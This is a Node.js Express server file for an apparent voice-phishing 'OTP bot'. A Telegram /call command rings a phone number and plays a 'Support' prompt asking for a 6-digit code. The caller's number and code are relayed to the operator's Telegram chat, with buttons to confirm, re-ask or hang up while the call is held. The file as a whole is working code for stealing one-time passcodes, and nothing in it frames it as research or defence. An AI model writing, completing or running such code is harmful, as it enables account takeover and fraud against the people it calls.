const express = require("express")
const bodyParser = require("body-parser")
const fetch = require("node-fetch")

const app = express()

app.use(bodyParser.urlencoded({extended:false}))
app.use(bodyParser.json())

// ENV VARIABLES
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN
const CHAT_ID = process.env.CHAT_ID

const SW_PROJECT = process.env.SW_PROJECT
const SW_TOKEN = process.env.SW_TOKEN
const SW_SPACE = process.env.SW_SPACE
const SW_NUMBER = process.env.SW_NUMBER

// SETTINGS
let settings={
company:"Support",
digits:6
}

// CALL STATE
let activeCallSid=null
let activeCaller=null
let lastCode=null

// TELEGRAM SEND FUNCTION
async function tg(method,data){
return fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`,{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify(data)
})
}

// SPEAK TO CALLER
async function speakToCaller(message){

if(!activeCallSid) return

await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls/${activeCallSid}`,{
method:"POST",
headers:{
"Authorization":"Basic "+Buffer.from(`${SW_PROJECT}:${SW_TOKEN}`).toString("base64"),
"Content-Type":"application/x-www-form-urlencoded"
},
body:`Twiml=<Response><Say>${message}</Say><Pause length="20"/></Response>`
})

}

// ROOT TEST
app.get("/",(req,res)=>{
res.send("Server running")
})

// IVR ROUTE
app.post("/ivr",async(req,res)=>{

const digits=req.body.Digits
const caller=req.body.From

if(!digits){

res.type("text/xml")

return res.send(`
<Response>

<Gather numDigits="${settings.digits}" action="/ivr" method="POST" timeout="10">

<Say>
Hello from ${settings.company}. Please enter your ${settings.digits} digit code.
</Say>

</Gather>

<Redirect>/ivr</Redirect>

</Response>
`)

}

// DIGITS RECEIVED
activeCallSid=req.body.CallSid
activeCaller=caller
lastCode=digits

await tg("sendMessage",{
chat_id:CHAT_ID,
text:`📞 CODE RECEIVED

Caller: ${caller}
Code: ${digits}

Choose action:`,

reply_markup:{
inline_keyboard:[
[
{ text:"✔ Confirm", callback_data:"confirm"},
{ text:"🔁 Ask Again", callback_data:"again"}
],
[
{ text:"⛔ Hang Up", callback_data:"hangup"}
]
]
}

})

res.type("text/xml")

res.send(`
<Response>
<Say>
Thank you. Your code has been received. Please wait.
</Say>
<Pause length="60"/>
</Response>
`)

})

// TELEGRAM WEBHOOK
app.post("/telegram",async(req,res)=>{

const data=req.body

// BUTTON PRESSED
if(data.callback_query){

const action=data.callback_query.data

if(action=="confirm"){

await speakToCaller("Thank you. Your code has been confirmed.")

await tg("sendMessage",{
chat_id:CHAT_ID,
text:"✔ Code confirmed"
})

activeCallSid=null

}

if(action=="again"){

await speakToCaller("Please enter your code again.")

}

if(action=="hangup"){

await speakToCaller("The call will now end.")

activeCallSid=null

}

}

// TELEGRAM COMMANDS
if(data.message){

const text=data.message.text

// STATUS
if(text=="/status"){

await tg("sendMessage",{
chat_id:CHAT_ID,
text:`Active caller: ${activeCaller || "none"}`
})

}

// START CALL
if(text.startsWith("/call")){

const number=text.split(" ")[1]

await fetch(`https://${SW_SPACE}/api/laml/2010-04-01/Accounts/${SW_PROJECT}/Calls`,{
method:"POST",
headers:{
"Authorization":"Basic "+Buffer.from(`${SW_PROJECT}:${SW_TOKEN}`).toString("base64"),
"Content-Type":"application/x-www-form-urlencoded"
},
body:`From=${SW_NUMBER}&To=${number}&Url=https://${req.headers.host}/ivr`
})

await tg("sendMessage",{
chat_id:CHAT_ID,
text:`📞 Calling ${number}`
})

}

}

res.sendStatus(200)

})

// SERVER START
const PORT=process.env.PORT||3000

app.listen(PORT,()=>{
console.log("Server running")
})
